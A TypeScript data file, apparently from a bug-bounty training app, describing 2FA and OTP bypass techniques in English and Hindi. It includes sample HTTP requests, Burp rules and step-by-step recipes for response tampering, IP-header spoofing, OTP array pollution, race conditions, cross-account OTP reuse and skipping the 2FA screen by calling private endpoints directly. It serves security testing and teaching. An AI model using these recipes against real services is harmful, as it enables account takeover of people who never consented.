import type { Lang } from "./types";

export interface OtpScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface OtpTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "response_tampering" | "rate_limit_evasion" | "race_condition" | "session_binding" | "state_bypass";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: OtpScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface OtpPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface OtpToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "bash_scanner" | "burp_rules" | "curl_oneliner" | "python_fuzzer";
  code: string;
  language: "bash" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface OtpReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP 2FA, OTP & RATE-LIMIT BYPASS TECHNIQUES ──────────────────────────
export const OTP_TECHNIQUES: OtpTechnique[] = [
  {
    id: "response-manipulation-status-tampering",
    title: {
      en: "Response Manipulation & Client-Side 2FA Verification Tampering",
      simple: "Tricking the Website into Thinking You Entered the Correct OTP",
      hi: "रिस्पॉन्स मैनिपुलेशन और स्टेटस कोड बदलकर 2FA बाईपास",
    },
    category: "response_tampering",
    difficulty: "beginner",
    successRate: "High on mobile apps and single-page applications (SPAs)",
    summary: {
      en: "Many modern Single Page Applications (React, Vue, Angular) and mobile apps (Flutter, React Native) rely on the frontend JavaScript client to interpret the OTP verification response. When an attacker enters an incorrect OTP (e.g. `000000`), the server returns `HTTP 400 Bad Request` or `{\"success\": false, \"message\": \"Invalid OTP\"}`. By intercepting the server's response in Burp Suite and modifying the status to `HTTP 200 OK` or `{\"success\": true}`, the client application assumes authentication succeeded and immediately transitions the user into the logged-in dashboard state.",
      simple: "You enter a wrong OTP code like 000000. The server says 'Wrong!'. You change that reply to 'Correct!' using Burp Suite before your browser sees it. The website immediately logs you in!",
      hi: "आप गलत OTP जैसे 000000 डालते हैं। सर्वर 'गलत OTP' का एरर भेजता है। आप Burp Suite में उस एरर को 'सफल (200 OK)' में बदल देते हैं। ब्राउज़र सोचता है कि OTP सही था और आपको तुरंत अकाउंट में लॉगिन करा देता है!",
    },
    scenarios: [
      {
        title: {
          en: "JSON Body Tampering: {\"success\": false} to {\"success\": true}",
          simple: "Changing 'false' to 'true' in the Server's Verification Answer",
          hi: "JSON में 'false' को 'true' बनाकर लॉगिन हासिल करना",
        },
        description: {
          en: "Submitting an invalid 6-digit OTP to `/api/v2/auth/verify-2fa` returns `{\"status\": 401, \"verified\": false, \"error\": \"INVALID_CODE\"}`. Modifying the response body in transit to `{\"status\": 200, \"verified\": true}` causes the frontend to store the session and render the private dashboard.",
          simple: "When the server replies saying 'verified: false', change it to 'verified: true'. The web app opens up right away.",
          hi: "सर्वर के रिस्पॉन्स में जब 'verified: false' आए, तो उसे 'verified: true' कर दें। वेब ऐप तुरंत डैशबोर्ड खोल देगा।",
        },
        commandOrRequest: `POST /api/v2/auth/verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/json

{"email": "victim@target.com", "otp": "000000"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": 200, "verified": true, "redirect_url": "/dashboard"}`,
        impact: {
          en: "Critical (P1): Complete bypass of Two-Factor Authentication, allowing total account takeover without knowing the victim's phone or authenticator app code.",
          simple: "Hackers can break into any account without needing the SMS or Authenticator code.",
          hi: "बिना किसी फोन या ऑथेंटिकेटर कोड के किसी भी अकाउंट का पूर्ण टेकओवर।",
        },
      },
      {
        title: {
          en: "HTTP Status Code Override: 403 Forbidden to 200 OK with Dummy JWT",
          simple: "Changing Error Code 403 to 200 to Fool Frontend Router",
          hi: "403 एरर को 200 OK में बदलकर 2FA स्क्रीन को पार करना",
        },
        description: {
          en: "The application uses the HTTP status code as the sole gatekeeper for navigation. Even if the backend didn't issue the final token, the frontend transitions to the password change screen when it sees HTTP 200, enabling an attacker to submit a new password request with the initial temporary auth token.",
          simple: "The frontend checks if the response is 200 OK. Turning the 403 error into 200 OK lets you set a new password directly.",
          hi: "फ़्रंट-एंड केवल 200 OK स्टेटस कोड देखता है। 403 को 200 में बदलते ही पासवर्ड रीसेट का अगला पेज खुल जाता है।",
        },
        commandOrRequest: `POST /api/auth/reset-password/confirm-otp HTTP/1.1
Host: target.com
Content-Type: application/json

{"reset_token": "tmp_981a2f", "code": "9999"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"allow_password_reset": true}`,
        impact: {
          en: "Immediate Account Takeover (ATO) via unauthorized password reset.",
          simple: "Directly resets the victim's account password.",
          hi: "विक्टिम के अकाउंट का पासवर्ड तुरंत रीसेट हो जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "In Burp Suite, navigate to Proxy -> Options -> Intercept Server Responses and enable 'Intercept responses to this request'.",
        simple: "Turn on response interception in Burp Suite so you can edit the server's replies.",
        hi: "Burp Suite में जाकर सर्वर रिस्पॉन्स को इंटरसेप्ट करने का विकल्प ऑन करें।",
      },
      {
        en: "Enter any random invalid OTP (e.g. `000000`) and click Submit.",
        simple: "Type in any fake OTP code like 000000 and send it.",
        hi: "कोई भी गलत OTP जैसे 000000 डालकर सबमिट करें।",
      },
      {
        en: "Intercept the outgoing request, then forward it to capture the incoming server response.",
        simple: "Forward the request and wait for the server's error response to arrive in Burp.",
        hi: "रिक्वेस्ट फॉरवर्ड करें और सर्वर का एरर रिस्पॉन्स Burp में पकड़ें।",
      },
      {
        en: "Change `400 Bad Request` / `401 Unauthorized` to `200 OK`, and modify JSON values: `false` -> `true`, `error` -> `null`.",
        simple: "Edit the response text from false to true and status 400 to 200 OK.",
        hi: "रिस्पॉन्स में 400 की जगह 200 OK करें और 'false' को 'true' बना दें।",
      },
      {
        en: "Forward the modified response to the browser and check if the dashboard or next step loads successfully.",
        simple: "Click forward in Burp and see if the website lets you right in!",
        hi: "बदला हुआ रिस्पॉन्स ब्राउज़र को भेजें और देखें कि क्या लॉगिन हो गया।",
      },
    ],
    burpOrToolRule: [
      "Burp Match & Replace: Match '\"success\":false' -> Replace '\"success\":true'",
      "Burp Match & Replace: Match 'HTTP/1.1 401 Unauthorized' -> Replace 'HTTP/1.1 200 OK'",
      "Caido Rule: On Response -> Modify Status to 200",
    ],
    hunterProTip: {
      en: "Always inspect the legitimate response on your own test account first! Create two accounts: enter the correct OTP on Account A to see the exact JSON structure and cookies returned on success, then replicate those exact keys when attacking Account B!",
      simple: "Test with your own account first so you know the exact secret words the server sends when an OTP is right.",
      hi: "पहले अपने अकाउंट पर सही OTP डालकर देखें कि सफल होने पर सर्वर कौन-से कुकीज और JSON हेडर भेजता है, फिर वही विक्टिम पर इस्तेमाल करें!",
    },
  },
  {
    id: "rate-limit-evasion-headers-and-paths",
    title: {
      en: "Rate-Limit & Anti-Brute-Force Evasion (Headers, Paths & Array Pollution)",
      simple: "Bypassing OTP Attempt Limits with Header Spoofing and Path Tricks",
      hi: "हेडर स्पूफिंग और पाथ ट्रिक्स से OTP रेट लिमिट बाईपास",
    },
    category: "rate_limit_evasion",
    difficulty: "intermediate",
    successRate: "High on reverse-proxy and cloud-hosted architectures",
    summary: {
      en: "Rate limits on OTP verification endpoints are commonly enforced by reverse proxies, WAFs, or API gateways that track client IP addresses. By spoofing client IP headers (`X-Forwarded-For`, `X-Real-IP`, `Client-IP`, `X-Originating-IP`), using path mutation tricks (`/verify-otp/`, `/./verify-otp`, `/verify-otp;`), or changing HTTP methods (POST to PUT, JSON to Form-Encoded), the rate limiting buckets are reset, allowing attackers to brute-force 4-digit or 6-digit codes indefinitely without triggering an IP ban.",
      simple: "Servers block you after 3 wrong tries based on your IP address. If you fake your IP with headers like X-Forwarded-For or add a tiny dot into the web address (/./verify), the server thinks you are a brand new visitor every single time!",
      hi: "सर्वर 3 बार गलत OTP डालने पर आपके IP को ब्लॉक कर देता है। अगर हम हर रिक्वेस्ट में `X-Forwarded-For: 1.2.3.4` हेडर बदलें या URL में `/./verify` लगा दें, तो सर्वर सोचता है कि हर बार नया यूजर आ रहा है और हम अनगिनत बार OTP टेस्ट कर सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "X-Forwarded-For Header Rotation for Unlimited OTP Brute Force",
          simple: "Changing Your Fake IP on Every Request to Try All 10,000 Codes",
          hi: "हर रिक्वेस्ट में नया IP भेजकर 4-डिजिट के सारे OTP जांचना",
        },
        description: {
          en: "Target endpoint `/api/v1/otp/verify` permits only 5 attempts per IP before locking out for 30 minutes. By injecting `X-Forwarded-For: 10.0.0.§1§` and incrementing the IP alongside the OTP payload in Burp Intruder (Pitchfork attack), the rate limit never triggers, allowing full enumeration of all 10,000 possible 4-digit OTP combinations in under 2 minutes.",
          simple: "Using Burp Intruder Pitchfork, change both the OTP and the fake IP simultaneously. You can test all 10,000 codes without ever getting blocked.",
          hi: "Burp Intruder के जरिए एक तरफ OTP बदलें और दूसरी तरफ IP। बिना ब्लॉक हुए पूरे 10,000 कोड टेस्ट हो जाएंगे।",
        },
        commandOrRequest: `POST /api/v1/otp/verify HTTP/1.1
Host: target.com
X-Forwarded-For: 10.12.4.99
X-Real-IP: 10.12.4.99
Content-Type: application/json

{"phone": "+1234567890", "code": "4812"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"authenticated": true, "session_token": "sess_891b2c4e..."}`,
        impact: {
          en: "High/Critical: 100% reliable 4-digit OTP brute force resulting in complete account takeover.",
          simple: "Guaranteed takeover for any account using 4-digit SMS OTP.",
          hi: "4-अंकों वाले किसी भी OTP का शत-प्रतिशत अकाउंट टेकओवर।",
        },
      },
      {
        title: {
          en: "Array Parameter Pollution: Submitting Multiple OTPs in a Single Request",
          simple: "Sending a List of 100 OTPs at Once in a Single Request",
          hi: "एक ही रिक्वेस्ट में 100 OTP एक साथ भेजकर रेट लिमिट बाईपास",
        },
        description: {
          en: "When the backend accepts JSON, passing an array of integers instead of a single string (`{\"otp\": [\"0001\", \"0002\", ..., \"0100\"]}`) counts as only 1 request towards the rate limiter. If the backend implementation uses `otp in allowed_otps` or iterates through the array, the correct code matches immediately while consuming only 1 attempt quota.",
          simple: "Instead of sending codes one by one, send a list of 100 codes in one shot. The counter only counts it as 1 attempt!",
          hi: "एक-एक करके भेजने के बजाय 100 OTP की लिस्ट एक साथ भेजें। रेट लिमिट केवल 1 गिनती करेगा लेकिन अंदर कोड मैच हो जाएगा।",
        },
        commandOrRequest: `POST /api/verify HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user_id": 4821,
  "otp": ["1111", "1112", "1113", "1114", "1115", "1116", "1117", "1118"]
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "matched_code": "1115"}`,
        impact: {
          en: "Bypasses request-based throttling to test thousands of OTPs in seconds.",
          simple: "Tests thousands of codes in just a few clicks.",
          hi: "सेकंडों में हजारों कोड टेस्ट करके रेट लिमिट से बचा जा सकता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Send 5 failed OTP attempts to establish the baseline lockout behavior (e.g. `HTTP 429 Too Many Requests`).",
        simple: "Intentionally fail 5 times to see the server's lockout message.",
        hi: "5 गलत OTP डालकर देखें कि सर्वर कब 429 Too Many Requests देता है।",
      },
      {
        en: "Add spoofed IP headers to the request: `X-Forwarded-For: 192.168.1.100`, `X-Real-IP: 192.168.1.100`.",
        simple: "Add X-Forwarded-For with a random IP to your request.",
        hi: "रिक्वेस्ट में `X-Forwarded-For` और `X-Real-IP` हेडर जोड़ें।",
      },
      {
        en: "Change the URL path slightly: `/api/verify` -> `/api/verify/` or `/api/./verify`.",
        simple: "Add a trailing slash or dot in the web path.",
        hi: "URL पाथ में `/verify` की जगह `/verify/` या `/./verify` लगाएं।",
      },
      {
        en: "If the server now accepts the request with `400 Invalid OTP` instead of `429 Too Many Requests`, the rate limiter is bypassed!",
        simple: "If the 429 error disappears, your rate limit bypass works!",
        hi: "अगर 429 का एरर हट जाता है, तो रेट लिमिट बाईपास सफल हो चुका है!",
      },
    ],
    burpOrToolRule: [
      "Burp Intruder Pitchfork: Payload 1 = Numbers 0000-9999, Payload 2 = IPs 10.0.0.1-10.0.39.16",
      "X-Forwarded-For Header list: X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-Host",
    ],
    hunterProTip: {
      en: "Test Content-Type switching: if the endpoint expects `application/x-www-form-urlencoded`, convert it to `application/json` or `multipart/form-data`. WAF rate limit rules often only inspect standard POST forms, leaving alternative encodings completely unmetered!",
      simple: "Change form format to JSON or Multipart. Many firewalls only count standard form submissions!",
      hi: "फॉर्म डेटा को JSON या Multipart में बदलकर भेजें। ज्यादातर WAF केवल सामान्य फॉर्म पर ही नजर रखते हैं!",
    },
  },
  {
    id: "race-condition-single-packet-attack",
    title: {
      en: "Single-Packet Race Condition on OTP Attempts Counter",
      simple: "Sending 50 Requests at the Exact Same Millisecond to Beat the Attempt Counter",
      hi: "सिंगल-पैकेट रेस कंडीशन से OTP काउंटर को चकमा देना",
    },
    category: "race_condition",
    difficulty: "advanced",
    successRate: "High on modern HTTP/2 servers with database latency",
    summary: {
      en: "Web applications generally restrict OTP attempts with sequential logic: 1) Read attempt count from database, 2) If count >= 3, return Error, 3) Verify OTP, 4) Increment count. When requests arrive concurrently within the same TCP packet (HTTP/2 Single-Packet Attack), multiple execution threads evaluate Step 1 simultaneously before any thread can update Step 4. This allows sending 30 to 100 OTP guesses in parallel within a 3-attempt limit window.",
      simple: "The server checks your count, tests the code, and then adds 1 to the count. If you fire 50 guesses at the exact same microsecond using HTTP/2, all 50 guesses check in before the counter has time to tick up!",
      hi: "सर्वर पहले देखता है कि कितने प्रयास हुए, फिर कोड जांचता है, और फिर काउंटर बढ़ाता है। HTTP/2 के जरिए अगर हम 50 रिक्वेस्ट एक ही मिलीसेकंड में भेजें, तो काउंटर बढ़ने से पहले ही सारे 50 प्रयास चेक हो जाते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Single-Packet HTTP/2 Concurrency to Exhaust 4-Digit OTP in Parallel",
          simple: "Testing 60 OTPs in Parallel Without Triggering the 3-Try Lockout",
          hi: "बिना लॉक हुए एक ही बार में 60 OTP का समानांतर परीक्षण",
        },
        description: {
          en: "Using Turbo Intruder with HTTP/2 single-packet synchronizer, 60 requests are synchronized and released on the wire at the exact same instant. Even though the application enforces a strict '3 failed attempts max' policy, all 60 requests return `200 OK` or `400 Invalid OTP` without receiving a `429 Lockout`.",
          simple: "Send 60 different OTPs at the identical instant. The server processes all of them simultaneously before locking out.",
          hi: "Turbo Intruder से 60 अलग-अलग OTP एक ही पल में भेजें। सर्वर लॉक करने से पहले सभी को प्रोसेस कर लेता है।",
        },
        commandOrRequest: `POST /api/v1/auth/verify-mfa HTTP/2
Host: target.com
Content-Type: application/json

{"session": "auth_token_7124", "otp": "%s"}`,
        responseSample: `HTTP/2 200 OK
Content-Type: application/json

{"success": true, "token": "jwt_logged_in_valid"}`,
        impact: {
          en: "Complete circumvention of anti-automation controls; enables rapid brute force within restricted trial windows.",
          simple: "Allows hackers to crack OTPs that were thought to be protected by 3-try limits.",
          hi: "3 प्रयासों की सख्त सुरक्षा के बावजूद OTP का क्रैक हो जाना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Send the OTP verification request to Burp Turbo Intruder.",
        simple: "Open the OTP request in Turbo Intruder.",
        hi: "OTP वेरिफिकेशन रिक्वेस्ट को Turbo Intruder में भेजें।",
      },
      {
        en: "Select the `race-single-packet-attack.py` template.",
        simple: "Choose the single-packet race condition python script.",
        hi: "सिंगल-पैकेट रेस कंडीशन स्क्रिप्ट सिलेक्ट करें।",
      },
      {
        en: "Configure the engine to queue 30-50 OTP payloads and release them with `engine.openGate('race')`.",
        simple: "Queue 30 guesses and release them all at once through the gate.",
        hi: "30 से 50 पेलोड कतार में लगाएं और एक साथ फायर करें।",
      },
      {
        en: "Observe the response statuses: if all 30 return 400 instead of being blocked after attempt 3, a race condition exists!",
        simple: "If all 30 get checked without being blocked, the race condition is confirmed!",
        hi: "अगर तीसरे प्रयास के बाद भी सभी 30 रिक्वेस्ट बिना ब्लॉक हुए जवाब देती हैं, तो रेस कंडीशन मौजूद है!",
      },
    ],
    burpOrToolRule: [
      "Turbo Intruder: engine=Engine.BURP2, concurrentConnections=1, requestsPerConnection=100",
      "Burp Repeater: Group requests in a tab group and select 'Send group in parallel (single-packet attack)'",
    ],
    hunterProTip: {
      en: "Burp Suite now has native Single-Packet Attack in Repeater! Put 20 OTP requests in a tab group, right click the send button, and select 'Send group in parallel (single-packet attack)'. No python script required for quick verification!",
      simple: "You can do this directly in Burp Repeater without any script by using 'Send group in parallel'!",
      hi: "Burp Repeater में 20 टैब बनाएं और 'Send group in parallel' पर क्लिक करें। बिना किसी कोडिंग के तुरंत रेस कंडीशन टेस्ट हो जाएगी!",
    },
  },
  {
    id: "session-binding-and-cross-account-leakage",
    title: {
      en: "Cross-Account OTP Session Decoupling & Reusability",
      simple: "Using Your Own Account's Valid OTP to Log Into the Victim's Account",
      hi: "क्रॉस-अकाउंट OTP डीकपलिंग (अपने OTP से दूसरे का अकाउंट खोलना)",
    },
    category: "session_binding",
    difficulty: "beginner",
    successRate: "Medium on legacy and fast-paced startup codebases",
    summary: {
      en: "A secure 2FA implementation binds an OTP specifically to the user's active session or user ID in the database. In vulnerable systems, the verification API only checks `WHERE otp_code = ? AND expires_at > NOW()`, without validating *who* requested that OTP. An attacker requests an OTP on their own phone/email (Attacker Account), receives valid code `849123`, and then submits that exact code during the login or password reset flow of the victim's account!",
      simple: "You ask for an OTP on your own phone. Then you type that code into the victim's login screen. Because the server forgot to link the code to a specific person, it accepts your code and logs you into the victim's account!",
      hi: "आप अपने मोबाइल पर एक OTP मंगाते हैं। फिर विक्टिम के लॉगिन पेज पर जाकर अपना वही कोड डाल देते हैं। सर्वर यह जांचना भूल जाता है कि कोड किसके लिए बना था और विक्टिम का अकाउंट खोल देता है!",
    },
    scenarios: [
      {
        title: {
          en: "Attacker OTP Accepted on Victim Password Reset Flow",
          simple: "Using Attacker's Reset Code to Hijack Victim's Account",
          hi: "अपने रीसेट कोड से विक्टिम का पासवर्ड रीसेट करना",
        },
        description: {
          en: "Attacker triggers password reset for both `attacker@evil.com` and `victim@target.com`. The attacker receives code `731920` on their email. On the victim's reset prompt, entering `731920` successfully advances to the new password page because the backend doesn't cross-reference the email with the token.",
          simple: "Request a reset for both accounts at the same time. Use the code from your email on the victim's screen.",
          hi: "दोनों अकाउंट्स पर रीसेट ट्रिगर करें। अपनी ईमेल पर आया कोड विक्टिम के पेज पर डालें।",
        },
        commandOrRequest: `POST /api/reset-password/verify HTTP/1.1
Host: target.com
Content-Type: application/json

{"email": "victim@target.com", "code": "731920"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "reset_session": "valid_reset_jwt_victim"}`,
        impact: {
          en: "Zero-interaction full Account Takeover (ATO) of any targeted company employee or admin.",
          simple: "Takes over any account with zero interaction needed from the victim.",
          hi: "बिना विक्टिम की जानकारी के किसी भी अकाउंट का तुरंत पूर्ण टेकओवर।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Register two test accounts: Account A (Attacker) and Account B (Victim).",
        simple: "Create two test accounts for yourself.",
        hi: "दो टेस्ट अकाउंट बनाएं: अकाउंट A और अकाउंट B।",
      },
      {
        en: "Initiate the 2FA or Password Reset flow on Account B (Victim).",
        simple: "Start the login or reset flow on the victim account.",
        hi: "विक्टिम अकाउंट पर 2FA या रीसेट प्रोसेस शुरू करें।",
      },
      {
        en: "Initiate the same flow on Account A (Attacker) and note the received OTP.",
        simple: "Get a valid OTP on your own attacker account.",
        hi: "अपने अटैकर अकाउंट पर OTP मंगाएं और कोड नोट करें।",
      },
      {
        en: "Enter Account A's OTP into Account B's prompt: if accepted, the OTP is not bound to the session!",
        simple: "Enter your code on the victim's prompt. If it works, you found a critical P1 bug!",
        hi: "अपना कोड विक्टिम के प्रॉम्प्ट में डालें। अगर काम कर जाए तो यह एक बड़ा P1 बग है!",
      },
    ],
    burpOrToolRule: [
      "Session Comparator: Compare Account A and Account B verification cookies and session IDs",
    ],
    hunterProTip: {
      en: "Also test OTP Reusability! Once you successfully verify an OTP, try using that same OTP a second time within its 5-minute validity window on another session or password reset. Many developers forget to delete the OTP from Redis/DB upon first consumption!",
      simple: "Try using the exact same OTP code twice. Servers often forget to delete it after the first use!",
      hi: "एक ही OTP को दोबारा डालकर देखें। बहुत से डेवलपर्स कोड इस्तेमाल होने के बाद उसे डेटाबेस से हटाना भूल जाते हैं!",
    },
  },
  {
    id: "state-bypass-forced-browsing-idor",
    title: {
      en: "2FA State Bypassing via Direct Endpoint Calling & Forced Browsing",
      simple: "Skipping the 2FA Screen Entirely by Going Straight to the Main App Links",
      hi: "डायरेक्ट लिंक और कुकीज से 2FA स्क्रीन को पूरी तरह छोड़ देना",
    },
    category: "state_bypass",
    difficulty: "beginner",
    successRate: "Medium on single-sign-on (SSO) and hybrid web applications",
    summary: {
      en: "When a user logs in with a valid password, the server frequently issues the primary session cookie immediately (e.g. `session_id=abc`), and relies on frontend redirection (`window.location = '/verify-2fa'`) to display the 2FA input screen. If the backend API endpoints (`/api/v1/user/profile`, `/api/v1/orders`, `/api/v1/transfer`) do not check whether `2fa_verified` is true in the session, an attacker can simply ignore the 2FA prompt and directly access all internal API features.",
      simple: "After you type your password, the server already gives you the key, but politely asks you to go to the 2FA page first. If you ignore that request and just click on your profile or settings link directly, everything works without ever entering a 2FA code!",
      hi: "पासवर्ड डालने के बाद सर्वर तुरंत सेशन कुकी जारी कर देता है, लेकिन ब्राउज़र को 2FA पेज पर भेजता है। अगर हम 2FA पेज पर जाने के बजाय सीधे `/api/v1/settings` का URL खोल लें, तो बिना OTP डाले पूरा अकाउंट खुल जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Direct API Ingestion Using Pre-2FA Session Cookie",
          simple: "Using the Initial Login Cookie Directly on Private APIs",
          hi: "प्रारंभिक सेशन कुकी से सीधे प्राइवेट API का इस्तेमाल करना",
        },
        description: {
          en: "After submitting valid credentials, the browser is sent to `/mfa-challenge`. The cookie `session=eyJhbGciOi...` is already set. Querying `GET /api/v1/me` with this cookie succeeds with 200 OK and returns sensitive user data, proving the backend fails to enforce 2FA verification gates on core APIs.",
          simple: "Copy your cookie right after typing the password and send a request to /api/me. If you get your account details, 2FA is totally useless.",
          hi: "पासवर्ड डालते ही मिलने वाली कुकी लेकर `/api/v1/me` पर रिक्वेस्ट भेजें। अगर डेटा मिल जाता है तो 2FA की कोई सुरक्षा नहीं बची।",
        },
        commandOrRequest: `GET /api/v1/user/account-summary HTTP/1.1
Host: target.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInN1YiI6IjEyMzQ1NiIsImlzXzJmYSI6ZmFsc2V9...`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"account_id": "ACC-9921", "balance": 15420.50, "email": "victim@target.com"}`,
        impact: {
          en: "High/Critical: 2FA provides zero actual defense against credential compromise.",
          simple: "Renders Two-Factor Authentication completely ineffective.",
          hi: "2FA की सुरक्षा पूरी तरह बेअसर साबित होती है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Log in with valid credentials until you arrive on the 2FA prompt.",
        simple: "Log in until you are stuck on the 2FA screen.",
        hi: "लॉगिन करें जब तक आप 2FA स्क्रीन पर न पहुंच जाएं।",
      },
      {
        en: "Copy your current session cookies and headers from the request.",
        simple: "Copy the session cookie from your browser or Burp.",
        hi: "Burp या ब्राउज़र से वर्तमान सेशन कुकी कॉपी करें।",
      },
      {
        en: "Open Burp Repeater and send a request to a private endpoint (e.g. `GET /api/dashboard` or `GET /api/v1/profile`).",
        simple: "Try opening the profile or settings page using that cookie.",
        hi: "उस कुकी के साथ प्रोफाइल या सेटिंग्स पेज पर सीधे रिक्वेस्ट भेजें।",
      },
      {
        en: "If the server returns user data instead of `403 2FA Required`, you have achieved a full 2FA state bypass!",
        simple: "If the server gives you your private info, you bypassed 2FA!",
        hi: "अगर बिना OTP के डेटा मिल जाए, तो 2FA स्टेट बाईपास हो गया!",
      },
    ],
    burpOrToolRule: [
      "Burp Autorun: Test endpoints with pre-2fa token vs post-2fa token",
    ],
    hunterProTip: {
      en: "Also test OAuth / Social Login! Even if an account has 2FA strictly enabled on email/password login, clicking 'Sign in with Google' or 'Sign in with GitHub' frequently skips the 2FA prompt entirely and grants instant session access!",
      simple: "Try clicking 'Login with Google'. Many sites forget to ask for 2FA when users log in with social buttons!",
      hi: "सोशल लॉगिन (Google/GitHub) से टेस्ट करें! बहुत सी साइट्स पासवर्ड पर तो 2FA मांगती हैं लेकिन गूगल लॉगिन पर 2FA पूछना भूल जाती हैं!",
    },
  },
];

// ─── 2. 5-PHASE 2FA & OTP METHODOLOGY ─────────────────────────────────────────
export const OTP_METHODOLOGY_PHASES: OtpPhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: OTP Flow & Architecture Discovery",
      simple: "Phase 1: Understanding How the Target Generates and Checks OTPs",
      hi: "चरण 1: OTP फ्लो और आर्किटेक्चर की पहचान",
    },
    objective: {
      en: "Map out all endpoints responsible for requesting, sending, and verifying OTP codes; measure length, character set, and lifecycle.",
      simple: "Find out where the OTP is sent, how long it is (4 digits or 6 digits), and how long it lasts.",
      hi: "पता करें कि OTP कहां से आता है, कितने अंकों का है और कितनी देर मान्य रहता है।",
    },
    steps: [
      {
        en: "Identify OTP parameters: digit count (4, 6, 8), entropy (numeric vs alphanumeric), and expiration window.",
        simple: "Check if the code is 4 digits or 6 digits and how many minutes it stays valid.",
        hi: "जांचें कि OTP 4-डिजिट है या 6-डिजिट और कितने मिनट काम करता है।",
      },
      {
        en: "Inspect response headers and body on OTP generation: look for code leaks directly in the response JSON or cookies.",
        simple: "Check if the server accidentally sends the OTP back in the response text.",
        hi: "जांचें कि क्या OTP मंगाने पर सर्वर रिस्पॉन्स में ही तो कोड लीक नहीं कर रहा।",
      },
      {
        en: "Test 'Resend OTP' logic: check whether resending generates a new code or reuses the same code with refreshed rate limits.",
        simple: "Click 'Resend OTP' to see if the same code is sent again.",
        hi: "'Resend OTP' दबाकर देखें कि क्या वही पुराना कोड दोबारा भेजा जाता है।",
      },
    ],
    commandsOrPayloads: [
      `POST /api/v1/auth/otp/send -d '{"email":"test@target.com"}'`,
      `curl -I https://target.com/api/v1/auth/otp/verify`,
    ],
    keyTargets: [
      "OTP length (4-digit is always high brute-force risk)",
      "Leaked OTP in response body or Set-Cookie",
      "Resend OTP button throttling",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Response Manipulation & Status Code Tampering",
      simple: "Phase 2: Testing if Changing Server Error Replies Logs You In",
      hi: "चरण 2: रिस्पॉन्स मैनिपुलेशन और स्टेटस कोड बदलना",
    },
    objective: {
      en: "Verify whether the client application (Web, Android, iOS) relies strictly on client-side parsing of the OTP validation response.",
      simple: "See if changing 'false' to 'true' in Burp Suite fools the website into logging you in.",
      hi: "जांचें कि क्या Burp में एरर को 200 OK करने से ऐप लॉगिन कर देता है।",
    },
    steps: [
      {
        en: "Enable response interception in Burp Suite.",
        simple: "Turn on response interception in Burp.",
        hi: "Burp में रिस्पॉन्स इंटरसेप्शन चालू करें।",
      },
      {
        en: "Submit an invalid OTP and intercept the resulting error response.",
        simple: "Submit a wrong code and capture the error reply.",
        hi: "गलत OTP डालकर सर्वर का एरर रिस्पॉन्स पकड़ें।",
      },
      {
        en: "Mutate HTTP status (400/401/403 -> 200 OK) and replace failure payloads with success structures.",
        simple: "Change 400 to 200 OK and false to true.",
        hi: "400 को 200 OK और 'false' को 'true' में बदलें।",
      },
    ],
    commandsOrPayloads: [
      `HTTP/1.1 200 OK\\nContent-Type: application/json\\n\\n{"success": true, "status": "VERIFIED"}`,
    ],
    keyTargets: [
      "JSON booleans (verified: true, success: true)",
      "HTTP Status 200 OK vs 401 Unauthorized",
      "Frontend token transitions",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Rate-Limit Auditing & Header Spoofing",
      simple: "Phase 3: Bypassing Wrong Attempt Limits Using Header and Path Tricks",
      hi: "चरण 3: रेट लिमिट और हेडर स्पूफिंग की जांच",
    },
    objective: {
      en: "Determine whether attempt counters and IP locks can be circumvented using IP spoofing headers, path mutations, or parameter variations.",
      simple: "Check if the server lets you guess unlimited times by changing your fake IP address.",
      hi: "जांचें कि क्या नकली IP हेडर लगाकर अनगिनत बार OTP डालने की अनुमति मिलती है।",
    },
    steps: [
      {
        en: "Trigger the rate limit by entering 5 wrong codes until lockout.",
        simple: "Enter 5 wrong codes to trigger the lockout.",
        hi: "5 बार गलत कोड डालकर लॉकआउट की पुष्टि करें।",
      },
      {
        en: "Inject client IP headers (`X-Forwarded-For`, `X-Real-IP`, `Client-IP`) with new random IPs.",
        simple: "Add X-Forwarded-For with a different IP.",
        hi: "नया IP डालकर `X-Forwarded-For` हेडर जोड़ें।",
      },
      {
        en: "Test path variations: `/verify/`, `/./verify`, `/verify;` to reset rate buckets.",
        simple: "Try adding extra slashes or dots to the URL.",
        hi: "URL में स्लैश या डॉट लगाकर नया पाथ टेस्ट करें।",
      },
    ],
    commandsOrPayloads: [
      `X-Forwarded-For: 127.0.0.1`,
      `X-Originating-IP: 10.0.0.1`,
